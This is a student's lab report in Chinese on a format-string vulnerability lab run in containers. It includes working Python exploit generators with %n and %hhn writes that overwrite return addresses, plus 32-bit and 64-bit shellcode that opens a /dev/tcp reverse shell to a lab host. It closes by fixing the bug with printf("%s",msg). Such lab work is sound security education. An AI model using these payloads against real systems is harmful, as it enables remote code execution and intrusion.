# LAB5 Format String
## 环境设置
### 关闭安全策略
![[Pasted image 20261029031903.png|423]]
### 易受攻击的程序
![[Pasted image 20261029032055.png|430]]
### 建立容器
![[Pasted image 20261029032247.png]]
## 任务 一
![[Pasted image 20261029032358.png|407]]

输入
`echo %s%s%s%s%s%s%s | nc 10.9.0.5 9090`并`Ctrl+C`后使程序崩溃

![[Pasted image 20261029033234.png|431]]

## 任务 二
### A 栈数据
构建64个`%x`的`badfile`输入
![[Pasted image 20261029040115.png]]
可以看到`0xbfffeeee`在第64个出现，因此需要64个`%x`
### B 堆数据
秘密数据地址是`0x080b4008`
修改构建`number`为秘密地址，并把第64个`%x`改为`%s`
得到秘密数据
![[Pasted image 20261029040306.png]]
## 任务 三
### A
target的地址是`0x080e5068`
把target地址放在buffer的第1000位，随后前面放很多个%x，随后逐渐减少%x的个数
![[Pasted image 20261029041611.png|533]]
测得314个%x可以刚好读到target地址
因此构建313个%x和1个%n
![[Pasted image 20261029043901.png|434]]
成功修改target
### B
0x062d比0x5000少0x49d3（18899），因此多输出18899个字符就行，用%0.18890x实现
![[Pasted image 20261029044926.png]]
### C
将修改拆分为aa bb cc dd，使用%hhn实现
四个地址分别为0x0805068/0x0805069/0x080506a/0x0805068b
```PYTHON
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number1  = 0x080e506b
content[1000:1004]  =  (number1).to_bytes(4,byteorder='little')
number2  = 0x080e506a
content[1008:1012]  =  (number2).to_bytes(4,byteorder='little')
number3  = 0x080e5069
content[1016:1020]  =  (number3).to_bytes(4,byteorder='little')
number4  = 0x080e5068
content[1024:1028]  =  (number4).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%x" * 312 + "%326d" + "%hhn" + "%273d" + "%hhn" + "%273d" + "%hhn" + "%273d" + "%hhn"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[0:len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
![[Pasted image 20261029051522.png]]
修改成功

## 任务 四
### 1 理解栈布局
>问题1

②是函数`myprintf`的返回地址，地址应为`frame pointer+4 = 0xffffd37c`③是`buf`的起始地址，可以从服务器输出直接获得：`0xffffd450`

>问题2

64个

### 2 Shellcode
0xffffd450+1200=0xffffd900
`s = "%x" * (312) + "%335d" + "%hhn" + "%256d" + "%hhn" + "%218d" + "%hhn" + "%39d" + "%hhn"`
```PYTHON
#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = 1200               # Change this number
content[start:start + len(shellcode)] = shellcode
s = "%x" * (312) + "%335d" + "%hhn" + "%256d" + "%hhn" + "%218d" + "%hhn" + "%39d" + "%hhn"
fmt = (s).encode('latin-1')
content[0:len(fmt)] = fmt

# ebp at 0xffffd378, return at 0xffffd37c
addr1 = 0xffffd37f
content[1000:1004] = (addr1).to_bytes(4,byteorder='little')
addr2 = 0xffffd37e
content[1008:1012] = (addr2).to_bytes(4,byteorder='little')
addr3 = 0xffffd37d
content[1016:1020] = (addr3).to_bytes(4,byteorder='little')
addr4 = 0xffffd37c
content[1024:1028] = (addr4).to_bytes(4,byteorder='little')
# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)

```
![[Pasted image 20261029062147.png]]
成功

## 任务 5

获得地址
![[Pasted image 20261029062355.png|468]]
先检测target在哪里
![[Pasted image 20261029064142.png]]
159个%p刚好输出
返回地址0x00007fffffffe380 + 1200 = 0x00007fffffffe830
这个地址被存在0x00007fffffffe2c0+8=0x00007fffffffe2c8
```python
#!/usr/bin/python3
import sys

shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
start = 1200               # Change this number
content[start:start + len(shellcode)] = shellcode
# 0x00007fffffffe380 + 1200 = 0x00007fffffffe830
s = "%p"*(159 - 2) + "%174lld"+"%hhn"+"%128lld"+"%hhn"+"%256lld"+"%hhn"+"%256lld"+"%hhn"+"%233lld"+"%hhn"+"%72lld"+"%hhn"
fmt = (s).encode('latin-1')
content[0:len(fmt)] = fmt

# %rsp at 0x00007fffffffe2c0; return address at 0x00007fffffffe2c8
addr1 = 0x00007fffffffe2cd
content[1000:1008] = (addr1).to_bytes(8,byteorder='little')
addr2 = 0x00007fffffffe2cc
content[1016:1024] = (addr2).to_bytes(8,byteorder='little')
addr3 = 0x00007fffffffe2cb
content[1032:1040] = (addr3).to_bytes(8,byteorder='little')
addr4 = 0x00007fffffffe2ca
content[1048:1056] = (addr4).to_bytes(8,byteorder='little')
addr5 = 0x00007fffffffe2c9
content[1064:1072] = (addr5).to_bytes(8,byteorder='little')
addr6 = 0x00007fffffffe2c8
content[1080:1088] = (addr6).to_bytes(8,byteorder='little')


# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

```
![[Pasted image 20261029064628.png]]
成功

## 任务 六
![[Pasted image 20261029032055.png|430]]
将变量 `msg` 直接作为 `printf` 的格式字符串，而不是当作普通输出内容。这意味着一旦 `msg` 中包含 `%n`、`%s` 等格式符，程序就会错误地将其解释为指令去读取或写入内存，从而引发崩溃或代码执行。
修改为`printf("%s",msg);`
编译后不报错，攻击也不生效。
![[Pasted image 20261029065002.png]]